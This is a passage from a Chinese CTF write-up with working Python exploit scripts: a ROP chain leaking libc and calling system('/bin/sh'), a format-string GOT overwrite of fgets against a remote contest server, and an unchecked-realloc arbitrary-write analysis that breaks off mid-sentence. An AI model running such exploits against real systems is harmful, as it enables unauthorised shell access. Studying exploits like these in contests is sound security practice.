&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;cur_data&nbsp;+&nbsp;ch_t&nbsp;*&nbsp;len_t
def&nbsp;pwn(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;the&nbsp;flag:\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;full_buff(&quot;a&quot;,&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;data&nbsp;len:&quot;,&nbsp;len(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write_plt_addr&nbsp;=&nbsp;l32(0x08048370)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read_plt_addr&nbsp;=&nbsp;l32(0x08048330)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read_got_addr&nbsp;=&nbsp;0x0804a00c
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write_got_addr&nbsp;=&nbsp;0x0804a01c
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp_str&nbsp;=&nbsp;l32(0x01010101)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p_ret&nbsp;=&nbsp;l32(0x08048311)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pp_ret&nbsp;=&nbsp;l32(0x0804853e)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ppp_ret&nbsp;=&nbsp;l32(0x0804853d)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;=&nbsp;write_plt_addr&nbsp;+&nbsp;ppp_ret&nbsp;+&nbsp;l32(0x1)&nbsp;+&nbsp;l32(write_got_addr)&nbsp;+&nbsp;l32(0x4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;+=&nbsp;read_plt_addr&nbsp;+&nbsp;ppp_ret&nbsp;+&nbsp;l32(0x0)&nbsp;+&nbsp;l32(write_got_addr)&nbsp;+&nbsp;l32(0x4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;+=&nbsp;read_plt_addr&nbsp;+&nbsp;ppp_ret&nbsp;+&nbsp;l32(0x0)&nbsp;+&nbsp;l32(read_got_addr)&nbsp;+&nbsp;l32(0x9)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;+=&nbsp;write_plt_addr&nbsp;+&nbsp;p_ret&nbsp;+&nbsp;l32(read_got_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;data&nbsp;+&nbsp;ebp_str&nbsp;+&nbsp;shellcode
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(payload&nbsp;+&nbsp;&#39;\n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read(0x4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;len(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write_real_addr&nbsp;=&nbsp;l32(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;hex(write_real_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_addr&nbsp;=&nbsp;write_real_addr&nbsp;-&nbsp;0x000dac50
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_real_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;0x00040190
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binstr_real_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;0x160a24
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(l32(system_real_addr))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(&quot;/bin/sh;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
io&nbsp;=&nbsp;get_io(target)
pwn(io)</pre><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">flag如下:</span></p><p style="text-align: left; text-indent: 28px;"><br/></p><p style="text-align: center;"><img alt="http://p9.qhimg.com/t01373ce68859a10c16.png" src="http://p5.qhimg.com/t01c223395d8414acea.png" title="t01373ce68859a10c16.png"/></p><p><br/></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">echo (200)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 逻辑非常简单:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p8.qhimg.com/t01c3d5e647e423573b.png" src="http://p8.qhimg.com/t01bb8e3ab85ab61d81.png" title="t01c3d5e647e423573b.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 属于格式化字符串漏洞,泄露地址后,用system将fgets的got表覆盖就可以拿到shell,开启了pie,泄露时还需要计算好got表的地址:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p3.qhimg.com/t016e15c76d339d7168.png" src="http://p8.qhimg.com/t01504106e81dcf0357.png" title="t016e15c76d339d7168.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">由于没有提供libc,直接与前面给出的地址作比较,猜想就是同一个libc,代码如下:</span></p><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&quot;pxx&quot;
from&nbsp;zio&nbsp;import&nbsp;*
import&nbsp;struct
target&nbsp;=&nbsp;(&quot;202.120.7.152&quot;,&nbsp;9995)
#target&nbsp;=&nbsp;&quot;./echo&quot;
def&nbsp;get_io(target):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;io
def&nbsp;full_buff(cur_data,&nbsp;length,&nbsp;ch_t&nbsp;=&nbsp;&#39;a&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len_t&nbsp;=&nbsp;length&nbsp;-&nbsp;len(cur_data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;cur_data&nbsp;+&nbsp;ch_t&nbsp;*&nbsp;len_t
def&nbsp;generate_format_string(index,&nbsp;length):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buff&nbsp;=&nbsp;&quot;%%%d$p.&quot;%(index)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(data)&nbsp;+&nbsp;len(buff)&nbsp;&gt;&nbsp;length:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;data,&nbsp;index
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;buff
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;+=&nbsp;1
def&nbsp;get_buff(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;times&nbsp;=&nbsp;10
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total_buff&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;times&nbsp;&gt;&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Your&nbsp;Message:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data,&nbsp;index&nbsp;=&nbsp;generate_format_string(index,&nbsp;127&nbsp;-&nbsp;20)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;times&nbsp;-=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(&#39;a&#39;&nbsp;*&nbsp;20&nbsp;+&nbsp;data&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read_until(&quot;\n&quot;).strip()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total_buff&nbsp;+=&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
def&nbsp;get_addr(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;times&nbsp;=&nbsp;10
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total_buff&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;times&nbsp;&gt;&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Your&nbsp;Message:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data,&nbsp;index&nbsp;=&nbsp;generate_format_string(index,&nbsp;127)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;times&nbsp;-=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(data&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read_until(&quot;\n&quot;).strip()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total_buff&nbsp;+=&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr&nbsp;=&nbsp;int(raw_input(&quot;addr&nbsp;to&nbsp;compare:&quot;),&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;index,&nbsp;item&nbsp;in&nbsp;enumerate(total_buff.split(&#39;.&#39;)[:-1]):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;item&nbsp;==&nbsp;&quot;(nil)&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;index&nbsp;+&nbsp;1,&nbsp;&quot;-&gt;&quot;,&nbsp;item,&nbsp;&quot;:&quot;,&nbsp;hex(int(item,&nbsp;16)&nbsp;-&nbsp;addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
def&nbsp;pwn(io):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Your&nbsp;Message:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;&quot;%43$p.%51$p&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(data&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read_until(&quot;\n&quot;).strip()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;data.split(&quot;.&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_start_main&nbsp;=&nbsp;int(data[0],&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fgets_got_addr&nbsp;=&nbsp;int(data[1],&nbsp;16)&nbsp;-&nbsp;(0xf770c030&nbsp;-&nbsp;0xf770c018)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#local
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset___libc_start_main_ret&nbsp;=&nbsp;0x19a83
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_system&nbsp;=&nbsp;0x0003e800
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_puts&nbsp;=&nbsp;0x000656a0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_memset&nbsp;=&nbsp;0x0007c680
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#remote
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset___libc_start_main_ret&nbsp;=&nbsp;0x19a83
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;=&nbsp;0x00040190
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_addr&nbsp;=&nbsp;libc_start_main&nbsp;-&nbsp;offset___libc_start_main_ret
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_real_addr&nbsp;=&nbsp;libc_addr&nbsp;+&nbsp;offset_system
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;text_addr&nbsp;=&nbsp;fgets_got_addr&nbsp;-&nbsp;0x00002018
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break_point&nbsp;=&nbsp;text_addr&nbsp;+&nbsp;0x0000081D
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;fgets_got_addr:&quot;,&nbsp;hex(fgets_got_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;break_point:&quot;,&nbsp;hex(break_point)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;system_real_addr:&quot;,&nbsp;hex(system_real_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Your&nbsp;Message:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;&quot;hello&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(data&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr&nbsp;=&nbsp;l32(fgets_got_addr)&nbsp;+&nbsp;l32(fgets_got_addr&nbsp;+&nbsp;1)&nbsp;+&nbsp;l32(fgets_got_addr&nbsp;+&nbsp;2)&nbsp;+&nbsp;l32(fgets_got_addr&nbsp;+&nbsp;3)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now_index&nbsp;=&nbsp;9
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_real_str&nbsp;=&nbsp;l32(system_real_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total_buff&nbsp;=&nbsp;&quot;/bin/sh;&quot;&nbsp;+&nbsp;addr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now_pos&nbsp;=&nbsp;len(total_buff)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(4):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now_value&nbsp;=&nbsp;(system_real_addr&nbsp;&gt;&gt;&nbsp;(i*8))&nbsp;&amp;&nbsp;0xff
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;now_value:&quot;,&nbsp;hex(now_value)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pad_count&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;now_value&nbsp;&gt;&nbsp;now_pos:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pad_count&nbsp;=&nbsp;now_value&nbsp;-&nbsp;now_pos
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pad_count&nbsp;=&nbsp;0x100&nbsp;-&nbsp;(now_pos&amp;0xff)&nbsp;+&nbsp;now_value
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now_pos&nbsp;+=&nbsp;pad_count
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;now_pos:&quot;,&nbsp;hex(now_pos)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;pad_count:&quot;,&nbsp;hex(pad_count)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;&quot;%%%dc%%%d$hhn&quot;%(pad_count,&nbsp;now_index)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now_index&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total_buff&nbsp;+=&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;total_buff
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(total_buff&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
io&nbsp;=&nbsp;get_io(target)
pwn(io)</pre><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">flag如下:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p2.qhimg.com/t01b78f1f9122afe66b.png" src="http://p4.qhimg.com/t01c8cc05ba0d7c569c.png" title="t01b78f1f9122afe66b.png"/></p><p><br/></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">dict (400)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这个题目漏洞发现的比较早,但是构造利用的时候花的时间比较长。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 漏洞的位置在条件新单词的时候,使用realloc函数申请内存,但是没有检查是否申请成功,如下:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p0.qhimg.com/t01059bbf2c7d958bff.png" src="http://p0.qhimg.com/t01c165d6a5f4f0921c.png" title="t01059bbf2c7d958bff.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 假设申请内存特别大,此时realloc返回0,此时count为正数,也会进入读数据的循环中,在读数据之前,计算了存储的起始地址:</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">v1 = (char *)(0x20 * (count_before + j) + dict_info_804A0C4[index].buff);</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">若此时buff为0,那么v1的值就是(0x20 * (count_before + j),那么此时就只与前面的数量相关了, 发生任意写(地址为32的整数倍),为了实现任意读,其实可以在这里进行灵活控制来设置,将v1指向0x804a0c0(也就是全局存储结构体count,ptr变量的位置),这个刚好也为32的整数倍,将其buff的值进行覆盖,改成got表,就可以泄露地址,而且可以在增加的时候,进行地址覆盖,覆盖时候可以多覆盖几个count和buff这样就可以实现不同功能的地址引用。有的用于泄露,有的用于改写,因为地址没法重复利用。</span></p><p style="text-indent: 